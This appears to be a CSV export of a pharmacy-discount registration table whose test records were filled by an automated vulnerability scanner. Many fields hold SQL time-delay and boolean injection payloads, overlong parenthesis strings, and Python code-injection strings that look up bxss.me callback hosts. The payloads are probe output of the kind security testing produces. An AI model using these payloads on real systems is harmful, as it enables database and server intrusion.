Unique ID,Surgery Name,Surgery Address 1,Surgery Address 2,Surgery Town,Surgery County,Surgery Post Code,Surgery Email,Surgery Telephone,TEVA Account No,TEVA Manager,Total Patients,Total Patients (Dispensing),Wholesaler Name,Wholesale Account,Wholesale Depot,Discount Axsain 45g,Discount Braltus Zonda 10mcg,Discount DuoResp Spiromax 160mcg/4.5mcg,Discount DuoResp Spiromax 320mcg/9mcg,Discount Qvar MDI 50mcg,Discount Qvar MDI 100mcg,Discount Qvar Easi-Breathe 50mcg,Discount Qvar Easi-Breathe 100mcg,Discount Zacin 45g,Authorised Signatory,Marketing Consent,Terms Agreement,Date Created,Activated,Date Activated,Sending bank details,
6227d379-4840-4cc6-b1c3-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitxnpkllzgyu550b5.&#039;+&#039;bxss.me&#039;)+&quot;,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d379-f4c8-4f7f-ab14-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d377-0e08-4c65-9f69-22858d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d378-ddc8-4db7-adee-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,a9UwXdwY&#039;)) OR 886=(SELECT 886 FROM PG_SLEEP(15))--,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d376-d0a4-4bf8-9664-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitxnpkllzgyu550b5.&quot;+&quot;bxss.me&quot;)+&#039;,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d376-1628-43e9-b622-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d375-6b2c-40e3-a751-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d376-7dc8-4fa7-b438-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,I0qdIRnS&#039;) OR 18=(SELECT 18 FROM PG_SLEEP(15))--,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d375-685c-4dcf-a61f-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d375-b048-465a-84ff-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitxnpkllzgyu550b5.&#039;+&#039;bxss.me&#039;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d374-bdcc-4b19-a944-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d374-6f9c-4eea-93c5-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,Saxs6O4l&#039; OR 791=(SELECT 791 FROM PG_SLEEP(15))--,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d372-faf8-423a-9c72-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,mbHgk48p&#039;; waitfor delay &#039;0:0:15&#039; -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d373-f85c-4481-8c3f-22898d00a510,znKScqHh,3137 Laguna Street,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitszhohdskli97dfe.&#039;+&#039;bxss.me&#039;)+&quot;,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d371-1708-41ba-a2aa-22868d00a510,znKScqHh,3137 Laguna Street,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitszhohdskli97dfe.&quot;+&quot;bxss.me&quot;)+&#039;,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d372-a7e8-4352-9557-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d370-e000-46cd-96ac-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,1 waitfor delay &#039;0:0:15&#039; -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36f-0680-499c-9096-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36f-c160-43f3-b58e-22888d00a510,znKScqHh,3137 Laguna Street,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitszhohdskli97dfe.&#039;+&#039;bxss.me&#039;),San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d370-0c28-4d0d-8f88-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36f-3d50-4bb5-a8e0-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,(select(0)from(select(sleep(15)))v)/*&#039;+(select(0)from(select(sleep(15)))v)+&#039;&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36d-f328-4250-963f-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36d-a0c4-4133-9da0-22888d00a510,znKScqHh,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitpbkqzngcsod956e.&#039;+&#039;bxss.me&#039;)+&quot;,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36e-8e90-4b35-9749-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36c-0360-4990-a7cc-22648d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,0&quot;XOR(if(now()=sysdate();sleep(15);0))XOR&quot;Z,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36c-2010-4b85-817f-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36b-83e8-4634-a71c-22858d00a510,znKScqHh,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitpbkqzngcsod956e.&quot;+&quot;bxss.me&quot;)+&#039;,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36b-d538-4552-bcd8-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36a-6e7c-4a99-8b1a-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,0&#039;XOR(if(now()=sysdate();sleep(15);0))XOR&#039;Z,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d36b-f2c0-4f5a-8bf4-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d369-b0a8-4888-bd11-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d368-7354-483d-bd75-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,if(now()=sysdate();sleep(15);0),4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d369-3a10-4e22-9aef-22858d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d369-5610-4e5e-9427-228a8d00a510,znKScqHh,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitpbkqzngcsod956e.&#039;+&#039;bxss.me&#039;),3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d367-b22c-4492-8143-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d366-1154-46aa-a9fa-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,-1&quot; OR 2+269-269-1=0+0+0+1 -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d367-d3c8-42d2-ac36-22858d00a510,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitgfbdeuyhnx81290.&#039;+&#039;bxss.me&#039;)+&quot;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d366-873c-4444-b6ce-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d364-2904-4ed8-9967-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,-1&#039; OR 2+906-906-1=0+0+0+1 or &#039;ngX9KCet&#039;=&#039;,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d365-22e0-45d8-b247-22858d00a510,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitgfbdeuyhnx81290.&quot;+&quot;bxss.me&quot;)+&#039;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d363-e19c-4c24-900c-22818d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d363-1e38-4e58-a9db-228a8d00a510,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitgfbdeuyhnx81290.&#039;+&#039;bxss.me&#039;),3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d363-67ec-49ed-b3be-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d364-0a14-41a2-b8b2-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d362-accc-4a97-b7dc-22888d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,-1&#039; OR 2+206-206-1=0+0+0+1 -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d361-7c74-4126-93a7-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d362-b950-4ab4-8610-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d360-2f68-4466-a0dc-22858d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,-1 OR 2+247-247-1=0+0+0+1,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d361-78f4-4bbb-90cd-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35f-ab48-4e60-acba-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35f-d208-49c8-b352-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d360-76c8-4abd-bdc3-22868d00a510,znKScqHh,3137 Laguna Street,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35f-777c-4574-8084-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35d-0cec-40bf-a1e6-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35d-18fc-4ec1-8d87-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35d-fa2c-4ef0-90c3-22868d00a510,znKScqHh,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35e-a86c-45b8-80a3-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,-1 OR 2+556-556-1=0+0+0+1 -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35c-5478-4b82-acc5-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35b-8018-4f36-9359-22868d00a510,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35b-c59c-4a6a-b05e-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,s4XFFTJ5,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35a-d85c-45fc-81bf-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35a-0fe4-4765-8e15-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d359-68a8-4470-9216-22878d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d35a-590c-4877-a1dd-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d358-bac4-4241-ac91-22848d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d358-9474-457d-b739-22898d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d359-7a04-4eda-9b3f-22868d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
6227d357-196c-4b98-a4e7-228a8d00a510,znKScqHh,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,znKScqHh,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-08,No,,Yes,
